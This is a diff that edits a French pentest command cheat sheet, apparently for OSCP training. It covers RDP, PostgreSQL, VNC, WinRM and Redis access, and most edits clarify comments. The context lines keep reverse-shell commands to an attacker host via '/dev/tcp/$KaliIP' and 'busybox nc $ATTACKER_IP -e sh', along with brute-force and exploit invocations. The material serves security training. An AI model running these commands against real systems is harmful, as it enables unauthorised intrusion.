@@ -2383,15 +2383,15 @@ crackmapexec rdp <target_ip> -u users.txt -p rockyou.txt
 
 ```bash
 # Se connecter au bureau distant avec FreeRDP (vérifier la version installée)
-xfreerdp /cert-ignore /bpp:8 /compression /themes /wallpaper /auto-reconnect /h:1000 /w:1600 /v:<IP> /u:<username> /p:<password>
+xfreerdp /v:192.0.2.10 /u:utilisateur /cert:ignore /size:1600x1000
 
-# Connectez-vous à un mapping de lecteur et à un timeout accru
-xfreerdp /u:<username> /v:<IP> /cert:ignore /p:<password> /timeout:20000 /drive:<drive_name>,<local_path>
+# Partager un répertoire local avec le bureau distant (FreeRDP 2.x ; adapter pour FreeRDP 3.x)
+xfreerdp /v:192.0.2.10 /u:utilisateur /cert:ignore /drive:partage,/home/kali/partage
 
-# Connectez-vous avec le support du presse-papiers et la résolution de réglage
-xfreerdp /compression +auto-reconnect /u:$USER/p:$PASSWORD /v:<ip> +clipboard /size:1920x1080 /drive:desktop,/home/$YOUR_USERNAME/Desktop
+# Activer le presse-papiers et régler la résolution (FreeRDP 2.x)
+xfreerdp /v:192.0.2.10 /u:utilisateur /cert:ignore +clipboard /size:1920x1080
 
-# Connectez-vous en utilisant rdesktop avec des identifiants
+# Alternative ancienne : rdesktop (préférer FreeRDP si disponible)
 rdesktop -u $USER -p $PASSWORD -g 1920x1080 <ip>
 
 # Connexion en utilisant rdesktop sans identifiants
@@ -2423,7 +2423,7 @@ nmap -sV -p 5432,5433 192.0.2.10
 <p class="oscp-command-note">Hydra : tester des identifiants autorisés sur POSTGRESQL à partir d'un dictionnaire.</p>
 
 ```bash
-hydra -L users.txt -P passwords.txt -s 5432 <ip> postgresql
+hydra -L utilisateurs.txt -P mots_de_passe.txt -s 5432 192.0.2.10 postgres
 
 ```
 
@@ -2435,7 +2435,7 @@ psql -h <IP_CIBLE> -U <UTILISATEUR> -d postgres -c '\l'
 ```
 
 ```bash
-# -W: Demander un mot de passe
+# -W : demander explicitement le mot de passe PostgreSQL
 psql -h <IP_CIBLE> -p 5432 -U <UTILISATEUR> -W
 
 ```
@@ -2453,14 +2453,14 @@ python3 50847.py -i <ip> -p 5437 -c "busybox nc $ATTACKER_IP 80 -e sh"
 <p class="oscp-command-note">SQL : préparer ou interroger les tables et fonctions liées à «PostgreSQL».</p>
 
 ```bash
-#POC  
+# Démonstration SQL PostgreSQL : COPY FROM PROGRAM exige des privilèges élevés  
 DROP TABLE IF EXISTS cmd_exec;  
 CREATE TABLE cmd_exec(cmd_output text);  
 COPY cmd_exec FROM PROGRAM 'id';  
 SELECT * FROM cmd_exec;  
 DROP TABLE IF EXISTS cmd_exec;
 
-#Reverse Shell
+# Exemple historique de shell inversé : ne pas confondre SQL et commande système
 DROP TABLE IF EXISTS cmd_exec;  
 CREATE TABLE cmd_exec(cmd_output text);
 COPY cmd_exec FROM PROGRAM 'sh -i >& /dev/tcp/$KaliIP/8080 0>&1';
@@ -2472,7 +2472,7 @@ DROP TABLE IF EXISTS cmd_exec;
 <p class="oscp-command-note">Lire les résultats d&#x27;une requête SQL.</p>
 
 ```sql
-# Liste toutes les bases de données
+# Dans l'invite psql : lister les bases de données
 \l
 
 # Se connecter à une base de données précise
@@ -2487,10 +2487,10 @@ DROP TABLE IF EXISTS cmd_exec;
 # Interroger le contenu d'une table spécifique
 SELECT * FROM <TABLE_NAME>;
 
-# Obtenez des informations détaillées sur un tableau, y compris les colonnes et leurs types
+# Afficher les colonnes, types et informations supplémentaires d'une table
 \d+ <TABLE_NAME>
 
-# Exécuter une requête pour trouver des données spécifiques, comme des utilisateurs avec un attribut particulier
+# Exemple de filtre SQL sur une table et une colonne qui doivent réellement exister
 SELECT * FROM users WHERE attribute = 'value';
 
 # Exemple de commande pour lister toutes les tables et leurs colonnes
@@ -2528,10 +2528,10 @@ nmap -sV -p 5900 --script vnc-info <IP_CIBLE>
 <p class="oscp-command-note">Ouvrir un accès graphique à la cible via VNC ou RDP.</p>
 
 ```bash
-# Utilisez vncviewer ou tigrevnc pour vous connecter à un serveur VNC
+# Ouvrir une session VNC sur le port TCP 5900 avec TigerVNC
 vncviewer <IP_CIBLE>::5900
 
-# Connexion plus détaillée avec l'authentification
+# Utiliser un fichier de mot de passe VNC préalablement créé
 vncviewer -passwd /chemin/vers/fichier_mot_de_passe <IP_CIBLE>::5900
 
 ```
@@ -2587,7 +2587,7 @@ Enter-PSSession -ComputerName <IP_CIBLE> -Credential (Get-Credential)
 <p class="oscp-command-note">Ouvrir une session distante WinRM.</p>
 
 ```bash
-# utilisant Kali pour se connecter à WinRM
+# Depuis Kali : ouvrir une session WinRM avec Evil-WinRM (compte autorisé requis)
 evil-winrm -i <ip> -u <USER> -p <PASSWORD>
 
 ```
@@ -2645,15 +2645,15 @@ python3 redis-rce-exploit.py -h <ip> -p 6379 -c "payload"
 <p class="oscp-command-note">Interroger un serveur Redis.</p>
 
 ```bash
-# Se connecter au serveur Redis
+# Ouvrir le client Redis ; une authentification peut être nécessaire
 redis-cli -h <IP_CIBLE> -p 6379
 
 # Après connexion, afficher les informations et les clés de la base sélectionnée
 info
-keys *
+scan 0
 select 0  # Sélectionner la base 0 (par défaut)
 
-# Exemple de lecture et écriture de clés dans un laboratoire
+# Créer puis lire une clé de test (modifie la base Redis ; laboratoire uniquement)
 set mykey myvalue
 get mykey
 
@@ -2701,7 +2701,7 @@ printf 'list\n' | nc -nv "$IP_CIBLE" "$PORT_TCP"
 
 # Exemple de commandes peut inclure :
 # - Listing users or available configurations
-# - Exécuter des commandes administratives le cas échéant
+# - N'exécuter les commandes administratives que dans le périmètre autorisé
 # - Collecte d'informations sur l'état ou la configuration du service
 
 # Remplacer par des commandes appropriées basées sur le service identifié et la sortie d'aide
